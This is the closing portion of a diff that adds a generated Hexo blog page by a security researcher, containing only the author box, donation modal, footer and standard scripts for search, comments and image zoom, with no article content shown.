+        <h3 class="media-heading"><a href="https://github.com/polosec" target="_blank"><span class="text-dark">Polo</span><small class="ml-1x">CTFer&amp;Cybersec Researcher</small></a></h3>
+        <div>Wong</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="uyan_frame"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2022/11/14/%E5%9B%9B%E5%B7%9D%E7%9C%81%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-AWD%E9%83%A8%E5%88%86WriteUp/" title="四川省信息安全技术大赛 AWD部分WriteUp"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/polosec" target="_blank"> polosec </a>base on <a href="https://github.com/polosec/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+    <script defer type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=[object Object]"></script>
+
+
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+
+
+</body>
+</html>
